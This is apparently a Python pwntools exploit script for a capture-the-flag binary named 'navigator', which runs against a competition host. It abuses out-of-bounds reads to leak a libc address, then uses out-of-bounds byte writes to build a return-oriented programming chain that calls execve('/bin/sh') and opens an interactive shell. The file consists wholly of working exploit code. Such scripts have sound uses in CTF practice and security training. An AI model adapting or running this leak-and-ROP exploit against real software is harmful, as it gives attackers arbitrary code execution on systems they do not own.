#!/usr/bin/python3
from pwn import *

elf = ELF("./navigator_patched")
libc = ELF("./libc.so.6")
context.binary = elf

gdb_cmds = ["c","b * main+249"]
r = ["chal.competitivecyber.club",8887]

def conf():
	if args.REMOTE:
		p = remote(r[0],r[1])
	else:
		p = elf.process()
		if args.GDB:
			gdb.attach(p,gdbscript='\n'.join(gdb_cmds))
	return p

p = conf()

def leak_byte(index):
	p.readuntil(">> ")
	p.sendline("2")
	p.readuntil(">> ")
	p.sendline(str(index))
	p.readuntil("Pin:\n")
	return p.readuntil("\n")[:-1]

def write_addr(index, address):
	addr = bytes(hex(address).strip('0x'),'utf-8')
	size = int(len(addr)/2)
	if size < 8:
		new_addr = b''
		for i in range(0,(8-size)):
			new_addr += b'00'
		addr = new_addr+addr
	packed = [int(b'0x'+addr[i:i+2],16) for i in range(0, len(addr), 2)]
	packed.reverse()
	for i in range(0,len(packed)):
		p.readuntil(">> ")
		p.sendline("1")
		p.readuntil(">> ")
		p.sendline(str(index))
		p.readuntil(">> ")
		p.sendline(p8(packed[i]))
		index += 1

def main():

	printf_leak = b''
	for x in range(296,290,-1):
		printf_leak += leak_byte(0-x)
	libc.address = u64(printf_leak+b'\x00\x00')-0x8dd96
	log.success("libc @ "+hex(libc.address))

	write_addr(344,libc.address+0x0000000000029139) # movaps
	write_addr(344+8,libc.address+0x000000000002a3e5) # rdi
	write_addr(344+(8*2),next(libc.search(b'/bin/sh')))
	write_addr(344+(8*3),libc.address+0x000000000002be51) # rsi
	write_addr(344+(8*4),0x0)
	write_addr(344+(8*5),libc.address+0x00000000000904a9) # rdx, r12
	write_addr(344+(8*6),0x0)
	write_addr(344+(8*7),0x0)
	write_addr(344+(8*8),libc.address+0x0000000000046068) # rax
	write_addr(344+(8*9),0x3b)
	write_addr(344+(8*10),libc.address+0x00000000000ec059) # syscall

	p.readuntil(">> ")
	p.sendline("3")
	p.interactive()


if __name__ == "__main__":
	main()
